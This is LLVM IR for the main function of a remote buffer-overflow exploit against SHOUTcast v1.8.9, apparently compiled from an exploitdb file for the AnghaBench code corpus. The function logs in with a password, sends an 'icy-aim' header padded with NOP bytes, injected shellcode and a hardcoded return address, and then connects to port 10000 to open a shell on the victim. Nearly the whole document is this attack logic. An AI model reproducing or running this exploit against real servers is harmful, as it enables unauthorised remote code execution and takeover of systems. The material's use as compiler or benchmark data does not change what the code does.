; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_21511.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_21511.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.pass = private unnamed_addr constant [256 x i8] c"changeme\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 16
@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [52 x i8] c"SHOUTcast v1.8.9 remote exploit by eSDee of Netric\0A\00", align 1
@.str.1 = private unnamed_addr constant [53 x i8] c"-----------------------------------(www.netric.org)\0A\00", align 1
@.str.2 = private unnamed_addr constant [7 x i8] c"t:p:a:\00", align 1
@EOF = common dso_local global i32 0, align 4
@optarg = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [16 x i8] c"Invalid port.\0A\0A\00", align 1
@sock = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [23 x i8] c"- Unable to connect.\0A\0A\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@shellcode = common dso_local global i8* null, align 8
@.str.6 = private unnamed_addr constant [34 x i8] c"icy-name: netric\0D\0Aicy-aim: %s\0D\0A\0D\0A\00", align 1
@.str.7 = private unnamed_addr constant [28 x i8] c"Connected, sending code...\0A\00", align 1
@.str.8 = private unnamed_addr constant [13 x i8] c"Ret: 0x%08x\0A\00", align 1
@.str.9 = private unnamed_addr constant [18 x i8] c"Exploit failed!\0A\0A\00", align 1
@.str.10 = private unnamed_addr constant [23 x i8] c"Exploiting succesful.\0A\00", align 1
@.str.11 = private unnamed_addr constant [53 x i8] c"---------------------------------------------------\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [1130 x i8], align 16
  %7 = alloca [1800 x i8], align 16
  %8 = alloca [256 x i8], align 16
  %9 = alloca [256 x i8], align 16
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = bitcast [256 x i8]* %9 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %14, i8* align 16 getelementptr inbounds ([256 x i8], [256 x i8]* @__const.main.pass, i32 0, i32 0), i64 256, i1 false)
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  store i32 8001, i32* %12, align 4
  store i32 134649479, i32* %13, align 4
  %15 = load i32, i32* @stdout, align 4
  %16 = call i32 (i32, i8*, ...) @fprintf(i32 %15, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str, i64 0, i64 0))
  %17 = load i32, i32* @stdout, align 4
  %18 = call i32 (i32, i8*, ...) @fprintf(i32 %17, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.1, i64 0, i64 0))
  br label %19

19:                                               ; preds = %58, %2
  %20 = load i32, i32* %4, align 4
  %21 = load i8**, i8*** %5, align 8
  %22 = call i32 @getopt(i32 %20, i8** %21, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))
  store i32 %22, i32* %11, align 4
  %23 = load i32, i32* @EOF, align 4
  %24 = icmp ne i32 %22, %23
  br i1 %24, label %25, label %59

25:                                               ; preds = %19
  %26 = load i32, i32* %11, align 4
  switch i32 %26, label %52 [
    i32 112, label %27
    i32 97, label %40
    i32 116, label %46
  ]

27:                                               ; preds = %25
  %28 = load i32, i32* @optarg, align 4
  %29 = call i32 @atoi(i32 %28)
  store i32 %29, i32* %12, align 4
  %30 = load i32, i32* %12, align 4
  %31 = icmp sle i32 %30, 0
  br i1 %31, label %35, label %32

32:                                               ; preds = %27
  %33 = load i32, i32* %12, align 4
  %34 = icmp sgt i32 %33, 65535
  br i1 %34, label %35, label %39

35:                                               ; preds = %32, %27
  %36 = load i32, i32* @stderr, align 4
  %37 = call i32 (i32, i8*, ...) @fprintf(i32 %36, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i64 0, i64 0))
  %38 = call i32 @exit(i32 1) #4
  unreachable

39:                                               ; preds = %32
  br label %58

40:                                               ; preds = %25
  %41 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %42 = call i32 @memset(i8* %41, i32 0, i32 256)
  %43 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %44 = load i32, i32* @optarg, align 4
  %45 = call i32 @strncpy(i8* %43, i32 %44, i32 255)
  br label %58

46:                                               ; preds = %25
  %47 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i64 0, i64 0
  %48 = call i32 @memset(i8* %47, i32 0, i32 256)
  %49 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i64 0, i64 0
  %50 = load i32, i32* @optarg, align 4
  %51 = call i32 @strncpy(i8* %49, i32 %50, i32 255)
  br label %58

52:                                               ; preds = %25
  %53 = load i8**, i8*** %5, align 8
  %54 = getelementptr inbounds i8*, i8** %53, i64 0
  %55 = load i8*, i8** %54, align 8
  %56 = call i32 @usage(i8* %55)
  %57 = call i32 @exit(i32 1) #4
  unreachable

58:                                               ; preds = %46, %40, %39
  br label %19

59:                                               ; preds = %19
  %60 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i64 0, i64 0
  %61 = call i32 @strlen(i8* %60)
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %63, label %69

63:                                               ; preds = %59
  %64 = load i8**, i8*** %5, align 8
  %65 = getelementptr inbounds i8*, i8** %64, i64 0
  %66 = load i8*, i8** %65, align 8
  %67 = call i32 @usage(i8* %66)
  %68 = call i32 @exit(i32 1) #4
  unreachable

69:                                               ; preds = %59
  %70 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i64 0, i64 0
  %71 = load i32, i32* %12, align 4
  %72 = call i32 @openhost(i8* %70, i32 %71)
  store i32 %72, i32* @sock, align 4
  %73 = load i32, i32* @sock, align 4
  %74 = icmp eq i32 %73, -1
  br i1 %74, label %75, label %79

75:                                               ; preds = %69
  %76 = load i32, i32* @stderr, align 4
  %77 = call i32 (i32, i8*, ...) @fprintf(i32 %76, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.4, i64 0, i64 0))
  %78 = call i32 @exit(i32 1) #4
  unreachable

79:                                               ; preds = %69
  %80 = load i32, i32* @sock, align 4
  %81 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %82 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %83 = call i32 @strlen(i8* %82)
  %84 = call i32 @write(i32 %80, i8* %81, i32 %83)
  %85 = load i32, i32* @sock, align 4
  %86 = call i32 @write(i32 %85, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0), i32 1)
  %87 = getelementptr inbounds [1800 x i8], [1800 x i8]* %7, i64 0, i64 0
  %88 = call i32 @memset(i8* %87, i32 0, i32 1800)
  %89 = getelementptr inbounds [1130 x i8], [1130 x i8]* %6, i64 0, i64 0
  %90 = call i32 @memset(i8* %89, i32 144, i32 1130)
  store i32 0, i32* %10, align 4
  br label %91

91:                                               ; preds = %106, %79
  %92 = load i32, i32* %10, align 4
  %93 = load i8*, i8** @shellcode, align 8
  %94 = call i32 @strlen(i8* %93)
  %95 = icmp slt i32 %92, %94
  br i1 %95, label %96, label %109

96:                                               ; preds = %91
  %97 = load i8*, i8** @shellcode, align 8
  %98 = load i32, i32* %10, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds i8, i8* %97, i64 %99
  %101 = load i8, i8* %100, align 1
  %102 = load i32, i32* %10, align 4
  %103 = add nsw i32 %102, 600
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds [1130 x i8], [1130 x i8]* %6, i64 0, i64 %104
  store i8 %101, i8* %105, align 1
  br label %106

106:                                              ; preds = %96
  %107 = load i32, i32* %10, align 4
  %108 = add nsw i32 %107, 1
  store i32 %108, i32* %10, align 4
  br label %91

109:                                              ; preds = %91
  %110 = load i32, i32* %13, align 4
  %111 = and i32 %110, 255
  %112 = trunc i32 %111 to i8
  %113 = getelementptr inbounds [1130 x i8], [1130 x i8]* %6, i64 0, i64 759
  store i8 %112, i8* %113, align 1
  %114 = load i32, i32* %13, align 4
  %115 = and i32 %114, 65280
  %116 = lshr i32 %115, 8
  %117 = trunc i32 %116 to i8
  %118 = getelementptr inbounds [1130 x i8], [1130 x i8]* %6, i64 0, i64 760
  store i8 %117, i8* %118, align 8
  %119 = load i32, i32* %13, align 4
  %120 = and i32 %119, 16711680
  %121 = lshr i32 %120, 16
  %122 = trunc i32 %121 to i8
  %123 = getelementptr inbounds [1130 x i8], [1130 x i8]* %6, i64 0, i64 761
  store i8 %122, i8* %123, align 1
  %124 = load i32, i32* %13, align 4
  %125 = and i32 %124, -16777216
  %126 = lshr i32 %125, 24
  %127 = trunc i32 %126 to i8
  %128 = getelementptr inbounds [1130 x i8], [1130 x i8]* %6, i64 0, i64 762
  store i8 %127, i8* %128, align 2
  %129 = getelementptr inbounds [1130 x i8], [1130 x i8]* %6, i64 0, i64 1120
  store i8 0, i8* %129, align 16
  %130 = getelementptr inbounds [1800 x i8], [1800 x i8]* %7, i64 0, i64 0
  %131 = getelementptr inbounds [1130 x i8], [1130 x i8]* %6, i64 0, i64 0
  %132 = call i32 @sprintf(i8* %130, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.6, i64 0, i64 0), i8* %131)
  %133 = load i32, i32* @stdout, align 4
  %134 = call i32 (i32, i8*, ...) @fprintf(i32 %133, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.7, i64 0, i64 0))
  %135 = load i32, i32* @stdout, align 4
  %136 = load i32, i32* %13, align 4
  %137 = call i32 (i32, i8*, ...) @fprintf(i32 %135, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.8, i64 0, i64 0), i32 %136)
  %138 = load i32, i32* @sock, align 4
  %139 = getelementptr inbounds [1800 x i8], [1800 x i8]* %7, i64 0, i64 0
  %140 = getelementptr inbounds [1800 x i8], [1800 x i8]* %7, i64 0, i64 0
  %141 = call i32 @strlen(i8* %140)
  %142 = call i32 @write(i32 %138, i8* %139, i32 %141)
  %143 = call i32 @sleep(i32 2)
  %144 = load i32, i32* @sock, align 4
  %145 = call i32 @close(i32 %144)
  %146 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i64 0, i64 0
  %147 = call i32 @openhost(i8* %146, i32 10000)
  store i32 %147, i32* @sock, align 4
  %148 = load i32, i32* @sock, align 4
  %149 = icmp eq i32 %148, -1
  br i1 %149, label %150, label %154

150:                                              ; preds = %109
  %151 = load i32, i32* @stderr, align 4
  %152 = call i32 (i32, i8*, ...) @fprintf(i32 %151, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.9, i64 0, i64 0))
  %153 = call i32 @exit(i32 1) #4
  unreachable

154:                                              ; preds = %109
  %155 = load i32, i32* @stdout, align 4
  %156 = call i32 (i32, i8*, ...) @fprintf(i32 %155, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.10, i64 0, i64 0))
  %157 = load i32, i32* @stdout, align 4
  %158 = call i32 (i32, i8*, ...) @fprintf(i32 %157, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.11, i64 0, i64 0))
  %159 = call i32 (...) @shell()
  ret i32 0
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #2

declare dso_local i32 @getopt(i32, i8**, i8*) #2

declare dso_local i32 @atoi(i32) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @strncpy(i8*, i32, i32) #2

declare dso_local i32 @usage(i8*) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @openhost(i8*, i32) #2

declare dso_local i32 @write(i32, i8*, i32) #2

declare dso_local i32 @sprintf(i8*, i8*, i8*) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @shell(...) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
